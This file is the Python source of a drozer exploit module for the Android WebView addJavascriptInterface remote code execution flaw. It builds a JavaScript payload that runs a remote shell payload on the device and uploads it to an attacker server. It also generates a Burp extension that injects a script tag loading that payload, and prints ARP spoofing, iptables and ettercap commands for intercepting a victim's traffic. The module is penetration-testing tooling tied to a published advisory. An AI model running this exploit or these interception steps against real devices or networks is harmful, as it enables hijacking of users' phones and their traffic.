from drozer.modules import common, Module
from drozer.configuration import Configuration
from mwr.common import fs
import tempfile, os, sys

class addJavaScriptInterface(Module, common.Exploit):
    
    name = "WebView addJavascriptInterface Remote Code Execution"
    description = """Exploit an application making use of a WebView with a JavaScript Interface defined. This requires that the attacker has the ability to inject JavaScript into the HTTP response going to the WebView. This can be achieved through any one of a number of traffic interception attacks.

Reference: https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/
Vulnerable Android applications are ones that meet the following conditions:
    * WebView with JavascriptInterface defined
    * WebView loads contents over clear text HTTP
    * Application or third-party SDK with JavascriptInterface is compiled with target API version < 17
    """
    examples = "$ drozer exploit build exploit.remote.mitm.addjavascriptinterface --payload weasel.shell.armeabi --server 10.10.10.10"
    author = ["nmonkee (@mwrlabs)", "Tyrone (@mwrlabs)"]
    date = "2013-11-07"
    license = "BSD (3 clause)"
    path = ["exploit", "remote", "mitm"]
    module_type = "exploit"

    payloads = ["weasel.shell.armeabi"] 

    def __init__(self, session, loader):
        Module.__init__(self, session)
        common.Exploit.__init__(self, loader)

        self.payload_format = "N"
        self.working_directory = "."

    def add_arguments(self, parser):
        parser.add_argument("--outputExtension", "-o", default=None, help="Path to save js-injector.py Burp extension")

    def generate(self, arguments):

        # Load addjsi-exploit-functions.js
        functions_path = Configuration.library(os.path.join("scripts", "addjsi-exploit-functions.js"))
        drozer_js = fs.read(functions_path)

        # Add payload
        drozer_js += "execute(\"cd \" + getDataDir() + \";" + self.payload.strip().replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ;") + "\");\n"

        sys.stdout.write("Uploading blank page to /...")
        if not self.upload(arguments, "/", " "):
            return

        sys.stdout.write("Uploading Exploit to /dz.js...")
        if not self.upload(arguments, "/dz.js", self.build_multipart({ ".*": drozer_js }, "gc0p4Jq0M2Yt08jU534c0p"), mimetype="application/x-javascript", headers={ "X-Drozer-Vary-UA": "true; boundary=gc0p4Jq0M2Yt08jU534c0p" }):
            return

        if arguments.outputExtension is None:
            tempDir = tempfile.mkdtemp()
            arguments.outputExtension = os.path.join(tempDir, "js-injector.py")

        # Load js-injector-skeleton.py
        js_injector_path = Configuration.library(os.path.join("scripts", "drozer-js-injector-skeleton.py"))
        js_injector = fs.read(js_injector_path)

        fs.write(arguments.outputExtension, js_injector.replace("$REPLACEME$", "http://" + str(arguments.server[0]) + ":" + str(arguments.server[1]) + "/dz.js"))
        sys.stdout.write("Burp extension saved to %s\n\n" % arguments.outputExtension)

        sys.stdout.write("The basis of this exploit is being able to inject the following code into a vulnerable WebView:\n")
        sys.stdout.write('<script src="http://%s:%s/dz.js"></script>\n' % (str(arguments.server[0]), str(arguments.server[1])))

        sys.stdout.write("""
To do this using ARP spoofing, perform the following steps:

1) Enable IP forwarding
# sysctl -w net.ipv4.ip_forward=1
or
# echo 1 > /proc/sys/net/ipv4/ip_forward

2) Start Burp Suite and create an invisible proxy on port 8080

3) Redirect HTTP traffic to local Burp Proxy port 8080
# iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080

4) Load the generated Burp extension
Saved to %s

5) ARP spoof between the device and the gateway e.g.
# ettercap -i wlan0 -Tq -M ARP:remote /192.168.1.1/ /192.168.1.117/

""" % arguments.outputExtension)
